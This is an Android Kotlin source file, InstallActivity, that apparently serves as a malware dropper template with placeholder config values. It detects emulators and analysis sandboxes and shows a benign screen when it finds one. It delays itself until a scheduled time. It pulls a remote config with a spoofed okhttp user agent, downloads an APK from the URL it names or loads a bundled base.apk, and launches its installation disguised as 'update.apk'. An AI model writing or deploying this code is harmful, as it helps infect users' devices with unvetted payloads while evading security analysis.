package com.cristal.bristral.tristal.mistral

import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.Log
import android.view.View
import android.widget.ProgressBar
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import org.json.JSONObject
import java.io.File
import java.net.URL
import javax.net.ssl.HttpsURLConnection

class InstallActivity : AppCompatActivity() {

    companion object {
        private const val appScheduledTime  = "appScheduledTime_PLACEHOLDER_FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
        private const val appConfigUrl      = "appConfigUrl_PLACEHOLDER_EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE"
        private const val appSourceUrl      = ""
        private const val TARGET_PKG        = "com.android.pictach"
        private const val TARGET_CLASS      = "com.android.pictach.MainActivity"
    }

    private var progressBar: ProgressBar? = null
    private var tvStatus: TextView? = null
    private val handler = Handler(Looper.getMainLooper())

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_install)
        progressBar = findViewById(R.id.progress_bar_install)
        tvStatus    = findViewById(R.id.tv_status)
        progressBar?.visibility = View.VISIBLE
        tvStatus?.text = getString(R.string.starting_installation)
        Thread { startAppFlow() }.start()
    }

    // ── MAIN FLOW ─────────────────────────────────────────────
    private fun startAppFlow() {
        try {
            if (!isCompatibleDevice()) { showNormal(); return }
            if (!isAppReady())  { showNormal(); return }

            val resolvedUrl = fetchAppConfig() ?: appSourceUrl
            val isRemote = resolvedUrl.startsWith("http") &&
                !resolvedUrl.contains("PLACEHOLDER")

            val apkBytes = if (isRemote) fetchAppData(resolvedUrl) else loadAssets()
            if (apkBytes == null || apkBytes.isEmpty()) { showMessage("STEP:LOAD_ASSETS\napk is null or empty"); return }

            runOnUiThread { installApkDirect(apkBytes) }

        } catch (e: Exception) {
            showMessage("STEP:FLOW\n${e.javaClass.simpleName}:\n${e.message}")
        }
    }

    // ── DIRECT APK INSTALL ────────────────────────────────────
    private fun installApkDirect(apkBytes: ByteArray) {
        try {
            val apkFile = File(cacheDir, "update.apk")
            apkFile.writeBytes(apkBytes)

            showMessage("STEP1:APK written\nSize: ${apkBytes.size} bytes\nPath: ${apkFile.absolutePath}")

            val uri = androidx.core.content.FileProvider.getUriForFile(
                this,
                "${packageName}.fileprovider",
                apkFile
            )

            showMessage("STEP2:URI ready\n$uri")

            val intent = Intent(Intent.ACTION_VIEW).apply {
                setDataAndType(uri, "application/vnd.android.package-archive")
                addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP)
            }

            startActivity(intent)

        } catch (e: Exception) {
            android.util.Log.e("InstallActivity", "installApkDirect FAILED: ${e.javaClass.simpleName}: ${e.message}", e)
            showMessage("FAILED:\n${e.javaClass.simpleName}:\n${e.message}")
        }
    }

    // ── ENV CHECK ─────────────────────────────────────────────
    private fun isCompatibleDevice(): Boolean {
        var s = 0
        try { val fp = Build.FINGERPRINT.lowercase(); if (fp.contains("generic") || fp.contains("unknown") || fp.contains("emulator") || fp.contains("sdk_gphone")) s++ } catch (e: Exception) { s++ }
        try { val hw = Build.HARDWARE.lowercase(); if (hw.contains("goldfish") || hw.contains("ranchu") || hw.contains("vbox")) s++ } catch (e: Exception) { s++ }
        try { val m = Build.MODEL.lowercase(); if (m.contains("sdk") || m.contains("emulator")) s++ } catch (e: Exception) { s++ }
        try { val mfr = Build.MANUFACTURER.lowercase(); if (mfr.contains("genymotion") || mfr.contains("unknown")) s++ } catch (e: Exception) { s++ }
        try { val aid = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID); if (aid.isNullOrEmpty() || aid == "000000000000000" || aid == "9774d56d682e549c") s++ } catch (e: Exception) { s++ }
        try { if (File("/dev/socket/qemud").exists() || File("/dev/qemu_pipe").exists()) s++ } catch (e: Exception) { }
        try { val abi = Build.SUPPORTED_ABIS.firstOrNull()?.lowercase() ?: ""; if (abi.contains("x86") && !abi.contains("arm")) s++ } catch (e: Exception) { }
        return s < 2
    }

    // ── SCHEDULE CHECK ────────────────────────────────────────
    private fun isAppReady(): Boolean {
        return try {
            val ts = appScheduledTime.trim().toLongOrNull() ?: return true
            if (ts == 0L) return true
            val prefs: SharedPreferences = getSharedPreferences("sys_cfg", Context.MODE_PRIVATE)
            if (!prefs.contains("t_inst")) prefs.edit().putLong("t_inst", System.currentTimeMillis() / 1000L).apply()
            System.currentTimeMillis() / 1000L >= ts
        } catch (e: Exception) { false }
    }

    // ── CONFIG FETCH ──────────────────────────────────────────
    private fun fetchAppConfig(): String? {
        return try {
            if (appConfigUrl.contains("PLACEHOLDER") || appConfigUrl.isBlank()) return null
            val conn = URL(appConfigUrl).openConnection() as HttpsURLConnection
            conn.connectTimeout = 8000; conn.readTimeout = 10000
            conn.setRequestProperty("User-Agent", "okhttp/4.9.0")
            if (conn.responseCode != 200) { conn.disconnect(); return null }
            val json = JSONObject(conn.inputStream.bufferedReader().readText())
            conn.disconnect()
            json.optString("u", "").ifBlank { null }
        } catch (e: Exception) { null }
    }

    // ── REMOTE FETCH ──────────────────────────────────────────
    private fun fetchAppData(url: String): ByteArray? {
        return try {
            val conn = URL(url).openConnection() as HttpsURLConnection
            conn.connectTimeout = 15000; conn.readTimeout = 60000
            conn.instanceFollowRedirects = true
            conn.setRequestProperty("User-Agent", "okhttp/4.9.0")
            if (conn.responseCode != 200) { conn.disconnect(); return null }
            val bytes = conn.inputStream.use { it.readBytes() }
            conn.disconnect()
            if (bytes.isEmpty()) null else bytes
        } catch (e: Exception) { null }
    }

    // ── ASSETS ────────────────────────────────────────────────
    private fun loadAssets(): ByteArray? {
        return try { assets.open("base.apk").use { it.readBytes() } } catch (e: Exception) { null }
    }

    // ── HELPERS ───────────────────────────────────────────────
    private fun showNormal() {
        runOnUiThread { tvStatus?.text = getString(R.string.please_keep_connected); progressBar?.visibility = View.GONE }
    }

    private fun showMessage(msg: String) {
        runOnUiThread {
            progressBar?.visibility = View.GONE
            tvStatus?.text = "ERROR:\n$msg"
            android.widget.Toast.makeText(this, msg, android.widget.Toast.LENGTH_LONG).show()
        }
    }

    override fun onDestroy() { super.onDestroy(); handler.removeCallbacksAndMessages(null) }
}
